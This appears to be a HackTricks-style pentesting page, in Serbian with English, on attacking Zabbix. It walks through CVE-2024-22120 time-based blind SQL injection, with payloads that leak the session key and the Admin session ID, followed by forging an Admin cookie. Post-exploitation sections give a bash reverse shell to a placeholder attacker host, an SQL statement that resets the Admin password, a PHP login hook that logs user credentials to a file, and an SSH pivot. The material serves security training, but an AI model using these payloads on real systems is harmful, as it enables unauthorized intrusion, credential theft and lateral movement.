# Sigurnost Zabbix-a

{{#include ../../banners/hacktricks-training.md}}

## Pregled

Zabbix je monitoring platforma koja izlaže web UI (obično iza Apache/Nginx) i serversku komponentu koja takođe koristi Zabbix protokol na TCP/10051 (server/trapper) i agent na TCP/10050. Tokom angažmana možete naići na:

- Web UI: HTTP(S) virtual host kao zabbix.example.tld
- Zabbix server port: 10051/tcp (JSON over a ZBXD header framing)
- Zabbix agent port: 10050/tcp

Korisni format kolačića: zbx_session je Base64 kompaktnog JSON objekta koji uključuje bar sessionid, serverCheckResult, serverCheckTime i sign. Sign je HMAC JSON payload-a.

## zbx_session cookie internals

Novije verzije Zabbix-a računaju kolačić ovako:

- data JSON: {"sessionid":"<32-hex>","serverCheckResult":true,"serverCheckTime":<unix_ts>}
- sign: HMAC-SHA256(key=session_key, data=JSON string of data sorted by keys and compact separators)
- Final cookie: Base64(JSON_with_sign)

Ako možete povratiti globalni session_key i važeći admin sessionid, možete offline proizvesti važeći Admin cookie i autentifikovati se u UI.

## CVE-2024-22120 — Time-based blind SQLi u audit logu Zabbix Servera

Pogođene verzije (prema javno dostupnoj dokumentaciji):

- 6.0.0–6.0.27, 6.4.0–6.4.12, 7.0.0alpha1

Sažetak ranjivosti:

- Kada se izvršenje skripte zabeleži u audit log Zabbix Servera, polje clientip nije sanirano i konkatenira se u SQL, što omogućava time-based blind SQLi preko serverske komponente.
- Ovo je iskoristivo slanjem crafted "command" zahteva na Zabbix server port 10051 sa važećim low-privileged sessionid-om, hostid-om kojem korisnik ima pristup i dozvoljenim scriptid-om.

Preduslovi i saveti za otkrivanje:

- sessionid: Iz guest/login u web UI, dekodirajte zbx_session (Base64) da biste dobili sessionid.
- hostid: Posmatrajte preko web UI zahteva (npr., Monitoring → Hosts) ili presretnite pomoću proxyja; čest podrazumevani je 10084.
- scriptid: Samo skripte dozvoljene trenutnoj roli će se izvršiti; proverite pregledom menija skripti/AJAX odgovora. Podrazumevani kao 1 ili 2 su često dozvoljeni; 3 može biti odbijen.

### Tok eksploatacije

1) Izazovite unos u audit log sa SQLi u clientip

- Povežite se na TCP/10051 i pošaljite Zabbix framed message sa request="command" koji sadrži sid, hostid, scriptid i clientip postavljen na SQL izraz koji će server konkatenirati i evaluirati.

Minimalna poruka (polja JSON tela):
```json
{
"request": "command",
"sid": "<low-priv-sessionid>",
"scriptid": "1",
"clientip": "' + (SQL_PAYLOAD) + '",
"hostid": "10084"
}
```
Puni wire format je: "ZBXD\x01" + 8-byte little-endian length + UTF-8 JSON. Možete koristiti pwntools ili sopstveni socket kod da ga formirate.

2) Time-bruteforce secrets via conditional sleep

Koristite uslovne izraze da leak hex-encoded tajne po 1 karakteru, mereći vreme odgovora. Primeri koji su radili u praksi:

- Leak global session_key from config:
```sql
(select CASE WHEN (ascii(substr((select session_key from config),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
- Leak Admin session_id (userid=1) iz sessions:
```sql
(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
Napomene:

- charset: 32 hex chars [0-9a-f]
- Pick T_TRUE >> T_FALSE (e.g., 10 vs 1) and measure wall-clock per attempt
- Ensure your scriptid is actually authorized for the user; otherwise no audit row is produced and timing won’t work

3) Forgirajte Admin cookie

Once you have:

- session_key: 32-hex from config.session_key
- admin_sessionid: 32-hex from sessions.sessionid for userid=1

Compute:

- sign = HMAC_SHA256(key=session_key, data=json.dumps({sessionid, serverCheckResult:true, serverCheckTime:now}, sort by key, compact))
- zbx_session = Base64(JSON_with_sign)

Set the cookie zbx_session to this value and GET /zabbix.php?action=dashboard.view to validate Admin access.

### Gotovi alati

- Public PoC automates: bruteforce of session_key and admin sessionid, and cookie forging; requires pwntools and requests.
- Parameters to provide typically include: --ip (FQDN of UI), --port 10051, --sid (low-priv), --hostid, and optionally a known --admin-sid to skip brute.

## RCE via Script execution (post-Admin)

With Admin access in the UI, you can execute predefined Scripts against monitored hosts. If agents/hosts execute script commands locally, this yields code execution on those systems (often as the zabbix user on Linux hosts):

- Quick check: run id to confirm user context
- Reverse shell example:
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```
Unapređenje TTY-a (Linux):
```bash
script /dev/null -c bash
# background with Ctrl+Z, then on attacker terminal:
stty raw -echo; fg
reset
```
Ako imate pristup DB-u, alternativa za forging a cookie je resetovanje Admin password-a na dokumentovani bcrypt za "zabbix":
```sql
UPDATE users SET passwd='$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username='Admin';
```
## Credential capture via login hook (post-exploitation)

Ako je moguće pisanje fajlova na web UI serveru, možete privremeno dodati isječak za beleženje u /usr/share/zabbix/index.php oko ogranka koji obrađuje prijavu putem forme kako biste zabeležili korisnička imena i lozinke:
```php
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
$user = $_POST['name'] ?? '??';
$password = $_POST['password'] ?? '??';
$f = fopen('/dev/shm/creds.txt','a+'); fputs($f, "$user:$password\n"); fclose($f);
CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
}
```
Korisnici se normalno autentifikuju; pročitajte /dev/shm/creds.txt nakon toga. Uklonite hook kada završite.

## Pivoting ka internim servisima

Čak i ako je shell servisnog naloga /usr/sbin/nologin, dodavanje unosa u SSH authorized_keys i korišćenje -N -L omogućava local port-forwarding ka loopback-only servisima (e.g., CI/CD at 8111):
```bash
ssh -i key user@host -N -L 8111:127.0.0.1:8111
```
Za više obrazaca tunelovanja pogledajte: [Tunneling and Port Forwarding](../../generic-hacking/tunneling-and-port-forwarding.md).

## Operativni saveti

- Proverite da li je scriptid dozvoljen za trenutnu ulogu (guest može imati ograničen skup)
- Timing brute može biti spor; keširajte vraćeni admin sessionid i ponovo ga koristite
- JSON poslat na 10051 mora biti uokviren sa ZBXD\x01 headerom i little-endian dužinom

## Reference

- [HTB Watcher — Zabbix CVE-2024-22120 to Admin/RCE and TeamCity root pivot](https://0xdf.gitlab.io/2025/10/09/htb-watcher.html)
- [CVE-2024-22120-RCE toolkit (PoC scripts)](https://github.com/W01fh4cker/CVE-2024-22120-RCE)

{{#include ../../banners/hacktricks-training.md}}
